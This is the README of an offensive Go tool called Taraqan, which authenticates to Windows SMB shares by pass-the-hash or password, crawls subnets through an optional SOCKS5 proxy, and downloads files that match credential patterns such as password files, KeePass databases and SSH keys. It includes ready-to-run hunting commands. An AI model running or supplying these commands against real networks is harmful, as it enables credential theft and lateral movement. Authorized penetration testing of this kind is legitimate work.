# Taraqan

Credential and sensitive file hunter for Windows networks. Authenticates to SMB shares using Pass-the-Hash or password, crawls directories, and identifies files matching configurable patterns. Supports automatic file download, SOCKS5 proxying, and encoding conversion.

## Features

- Pass-the-Hash (NTLM) and password authentication
- Subnet scanning with CIDR notation
- Pattern-based sensitive file detection
- Automatic file download with UTF-8 conversion
- SOCKS5 proxy support (including authentication)
- Multi-threaded host and share scanning
- Built-in patterns for common secrets

## Installation

```bash
git clone https://github.com/but43r/Taraqan.git
cd Taraqan
go build -o taraqan -ldflags="-s -w" .
```

Cross-compile for Linux:
```bash
GOOS=linux GOARCH=amd64 go build -o taraqan -ldflags="-s -w" .
```

## Usage

```bash
# Hunt for secrets using PTH
./taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Custom patterns + download
./taraqan -t 10.1.0.0/16 -u admin -d DOMAIN -H hash \
  --patterns "*учетк*,*пароль*,*доступы*,*.kdbx" --download -v

# Through SOCKS5 proxy
./taraqan -t 10.1.0.0/24 -u admin -d DOMAIN -H hash \
  --socks5 127.0.0.1:1080 --download -v

# SOCKS5 with authentication
./taraqan -t 10.1.0.0/24 -u admin -d DOMAIN -H hash \
  --socks5 user:pass@proxy:1080

# Password auth + export results
./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123" -o results.json

# Skip admin shares
./taraqan -t 10.0.0.0/24 -u admin -H hash --skip-admin --download
```

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | - | Target IP or CIDR (required) |
| `-u, --username` | - | Username (required) |
| `-d, --domain` | `.` | Domain name |
| `-H, --hash` | - | NT hash for PTH |
| `-p, --password` | - | Password |
| `--patterns` | built-in | Patterns file or comma-separated list |
| `--threads` | 10 | Host scan threads |
| `--share-threads` | 3 | Share threads per host |
| `--share-timeout` | 2m | Timeout per share |
| `--depth` | 5 | Max directory depth |
| `--socks5` | - | SOCKS5 proxy (host:port or user:pass@host:port) |
| `--download` | off | Download matched files |
| `--download-dir` | ./loot | Download directory |
| `--max-size` | 10 | Max download size (MB) |
| `--skip-admin` | off | Skip admin shares (ADMIN$, C$, etc.) |
| `-o, --output` | - | Output file path |
| `--format` | json | Output format (json/csv) |
| `-v, --verbose` | off | Verbose output |

## Built-in Patterns

- Credentials: `*password*`, `*credential*`, `*secret*`
- Key files: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
- Configs: `web.config`, `.env`, `appsettings.json`
- Remote access: `*.rdp`, `ultravnc.ini`

Custom patterns can be provided as a comma-separated list or loaded from a file (one pattern per line, `#` for comments).

## Encoding

Downloaded text files (.txt, .ini, .config, .xml, .env, .json) are automatically converted to UTF-8. Supported source encodings: UTF-16 LE/BE, Windows-1251 (Cyrillic), UTF-8 with BOM.

## Disclaimer

For authorized penetration testing only.

## License

MIT
